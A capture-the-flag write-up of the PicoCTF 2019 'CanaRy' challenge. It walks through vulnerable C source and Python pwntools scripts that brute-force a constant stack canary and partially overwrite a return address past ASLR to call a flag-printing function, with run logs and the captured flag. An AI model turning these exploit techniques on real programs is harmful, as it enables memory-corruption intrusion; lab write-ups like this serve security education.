# PicoCTF19 CanaRy

## Challenge

This time we added a canary to detect buffer overflows. Can you still find a way to retreive the flag from this [program](https://2019shell1.picoctf.com/static/6811022be7c0f9b08826d5cdcc20a2bf/vuln) located in /problems/canary_3. [Source](https://2019shell1.picoctf.com/static/6811022be7c0f9b08826d5cdcc20a2bf/vuln.c).

## Hints

Maybe there's a smart way to brute-force the canary?

## Solution

In this question, we have an additional file in our directory:

```
samson@pico-2019-shell1:/problems/canary_3$ ls -al
total 96
drwxr-xr-x   2 root       root        4096 Sep 28  2019 .
drwxr-x--x 684 root       root       69632 Oct 10  2019 ..
-r--r-----   1 hacksports canary_3       5 Sep 28  2019 canary.txt
-r--r-----   1 hacksports canary_3      42 Sep 28  2019 flag.txt
-rwxr-sr-x   1 hacksports canary_3    7744 Sep 28  2019 vuln
-rw-rw-r--   1 hacksports hacksports  1469 Sep 28  2019 vuln.c
```

Here's the file

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUF_SIZE 32
#define FLAG_LEN 64
#define KEY_LEN 4

void display_flag() {
  char buf[FLAG_LEN];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }
  fgets(buf,FLAG_LEN,f);
  puts(buf);
  fflush(stdout);
}

char key[KEY_LEN];
void read_canary() {
  FILE *f = fopen("/problems/canary_3/canary.txt","r");
  if (f == NULL) {
    printf("[ERROR]: Trying to Read Canary\n");
    exit(0);
  }
  fread(key,sizeof(char),KEY_LEN,f);
  fclose(f);
}

void vuln(){
   char canary[KEY_LEN];
   char buf[BUF_SIZE];
   char user_len[BUF_SIZE];

   int count;
   int x = 0;
   memcpy(canary,key,KEY_LEN);
   printf("Please enter the length of the entry:\n> ");

   while (x<BUF_SIZE) {
      read(0,user_len+x,1);
      if (user_len[x]=='\n') break;
      x++;
   }
   sscanf(user_len,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,key,KEY_LEN)) {
      printf("*** Stack Smashing Detected *** : Canary Value Corrupt!\n");
      exit(-1);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  int i;
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  read_canary();
  vuln();

  return 0;
}
```

Let's also run our sanity checks for protections applied:

```bash
samson@pico-2019-shell1:/problems/canary_3$ checksec vuln
[*] '/problems/canary_3/vuln'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled (ASLR)
```

For context, a canary is just a value on the stack between local variables and function return addresses.

They are used to mitigate against buffer overflow attacks by verifying that this value is always on the stack to verify the stack has not been "smashed" or compromised.

This is usually added by the compiler with a flag, but for illustrative purposes the problem seems to implement an application version of the canary.

------------

So at the start of the program, it seems the the program loads the canary of size 4 bytes into a global variable of type char.

```
#define KEY_LEN 4
char key[KEY_LEN];
void read_canary() {
  FILE *f = fopen("/problems/canary_3/canary.txt","r");
  if (f == NULL) {
    printf("[ERROR]: Trying to Read Canary\n");
    exit(0);
  }
  fread(key,sizeof(char),KEY_LEN,f);
  fclose(f);
}
```

If we were able to read `canary.txt` (which we can't), we would know what to fill our buffer overflow with, however we don't. On the other hand, due to this function we know it's constant.

Fun Fact: Windows XP used to use a constant canary and you could brute-force it byte by byte. This may be the solution here.

```c
   char canary[KEY_LEN];
   char buf[BUF_SIZE];
   char user_len[BUF_SIZE];

   int count;
   int x = 0;
   memcpy(canary,key,KEY_LEN);
   printf("Please enter the length of the entry:\n> ");

   while (x<BUF_SIZE) {
      read(0,user_len+x,1);
      if (user_len[x]=='\n') break;
      x++;
   }
   sscanf(user_len,"%d",&count);
```

The program prompts us for the length of the entry, not sure what that is yet. But it reads from user input and places it into a buffer `user_len`.

Then it reads the input we pass it with a vulnerable function, but it reads only the amount we said we'd send it.

`read(0,buf,count);`

```
samson@pico-2019-shell1:/problems/canary_3$ ./vulnPlease enter the length of the entry:
> 0
Input> Ok... Now Where's the Flag?
samson@pico-2019-shell1:/problems/canary_3$ ./vuln
Please enter the length of the entry:
> 1
Input> 1
Ok... Now Where's the Flag?
samson@pico-2019-shell1:/problems/canary_3$ ./vuln
Please enter the length of the entry:
> 64
Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
*** Stack Smashing Detected *** : Canary Value Corrupt!
```

At this point, we sort of know what we have to do. We have to bruteforce the canary which is 4 bytes, then overwrite the first return address with the address of the `display_flag()` function.

We will attempt to attack the canary one value at a time, let's create our python script to do this for us.

```python
#!/usr/bin/env python

from pwn import *

s = ssh(host = '2019shell1.picoctf.com', user='samson', password='REDACTED')

canary = ''
while len(canary) < 4: # Only 1024 iterations, possible because of 32bit
    for i in range(256): # from 00 to FF in each byte
        p = s.process('/problems/canary_3/vuln')
        p.sendlineafter('> ', '{}'.format(32 + len(canary) + 1)) # BUF_SIZE + 1 intending to write past canary
        p.sendlineafter('> ', 'A' * 32 + canary + '{}'.format(chr(i)))
        l = p.recvline()

        if '*** Stack Smashing Detected' not in str(l):
            canary += chr(i)
            log.info('Partial canary: {}'.format(canary))
            break

        p.close()
log.info('Found canary: {}'.format(canary))
```

```bash
$ python canary.py 
...
[*] Partial canary: 57Gh
[*] Found canary: 57Gh
```

Great we have the canary: `57Gh`

However, it's not as simple as the usual buffer overflow now. since PIE or ASLR is enabled, the address of `display_flag()` is randomized. 

Let's check the value once:

```
samson@pico-2019-shell1:/problems/canary_3$ gdb ./vuln 
(gdb) b main
Breakpoint 1 at 0xa14
(gdb) run
Starting program: /problems/canary_3/vuln 

Breakpoint 1, 0x56586a14 in main ()
(gdb) x display_flag
0x565867ed <display_flag>:      0x53e58955
-----------------
samson@pico-2019-shell1:/problems/canary_3$ gdb ./vuln 
(gdb) x display_flag
0x7ed <display_flag>:   0x53e58955
(gdb) b main
Breakpoint 1 at 0xa14
(gdb) r
Starting program: /problems/canary_3/vuln 

Breakpoint 1, 0x565cfa14 in main ()
(gdb) x display_flag
0x565cf7ed <display_flag>:      0x53e58955
```

Interestingly enough, for some reason if you try this over and over again, the addresses seem to repeat. Only 3 bytes.
Let's brute force it? We can attempt to use one of the addresses and hope there will a chance it'll work.

Again, this will only work since we're in 32-bit mode, even more so since only a few of the 32 bits are random.

Let's construct our payload:
```
payload = "A"*32 + canary + "A"*16 + "\xed\x07"
```

We can determine the offset from the canary to the bottom of the stack but looking at the assembly code for the offset to the frame pointer, trail and error with multiples of 4, or even using the pwntools cyclic command.

In this case, I'll use GDB for brevity, remember that we're looking for `ebp` when looking for clues of an offset. 0x10 is 16 bytes.

```
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x000008f4 <+0>:     push   %ebp
   0x000008f5 <+1>:     mov    %esp,%ebp
   0x000008f7 <+3>:     push   %ebx
   0x000008f8 <+4>:     sub    $0x54,%esp
   0x000008fb <+7>:     call   0x6f0 <__x86.get_pc_thunk.bx>
   0x00000900 <+12>:    add    $0x16a0,%ebx
   0x00000906 <+18>:    movl   $0x0,-0xc(%ebp)
   0x0000090d <+25>:    lea    0x6c(%ebx),%eax
   0x00000913 <+31>:    mov    (%eax),%eax
   0x00000915 <+33>:    mov    %eax,-0x10(%ebp)    <<<<
   0x00000918 <+36>:    sub    $0xc,%esp
   0x0000091b <+39>:    lea    -0x1414(%ebx),%eax
```

Now we can code our exploit with our known canary:

```python
#!/usr/bin/env python3

from pwn import *

s = ssh(host = '2019shell1.picoctf.com', user='samson', password='REDACTED')
s.set_working_directory('/problems/canary_3/')
canary = "57Gh"
address_display_flag = 0x565cf7ed
while True:
    p = s.process('./vuln')
    p.sendlineafter('> ', '54') # Size of payload
    payload = "A"*32 + canary + "A"*16 + "\xed\x07"
    p.sendlineafter('> ', payload)
    out = p.recvall()
    print(out)
    if "pico" in str(out):
        print(out)
        break
    p.close()
```

```
samson@pico-2019-shell1:/problems/canary_3$ python ~/p2.py 
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[!] Couldn't check security settings on '2019shell1.picoctf.com'
[*] Working directory: '/problems/canary_3/'
[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174334
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174334)
Ok... Now Where's the Flag?

[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174341
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174341)
Ok... Now Where's the Flag?

[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174348
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174348)
Ok... Now Where's the Flag?

[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174355
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174355)
Ok... Now Where's the Flag?

[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174362
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174362)
Ok... Now Where's the Flag?

[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174369
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174369)
Ok... Now Where's the Flag?

[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174376
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174376)
Ok... Now Where's the Flag?

[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174384
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174384)
Ok... Now Where's the Flag?

[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174391
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174391)
Ok... Now Where's the Flag?

[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174398
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174398)
Ok... Now Where's the Flag?

[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174405
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174405)
Ok... Now Where's the Flag?

[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174412
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174412)
Ok... Now Where's the Flag?

[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174419
[+] Receiving all data: Done (71B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174419)
Ok... Now Where's the Flag?
picoCTF{cAnAr135_mU5t_b3_r4nd0m!_0bd260ce}

Ok... Now Where's the Flag?
picoCTF{cAnAr135_mU5t_b3_r4nd0m!_0bd260ce}
```

## Flag

`picoCTF{cAnAr135_mU5t_b3_r4nd0m!_0bd260ce}`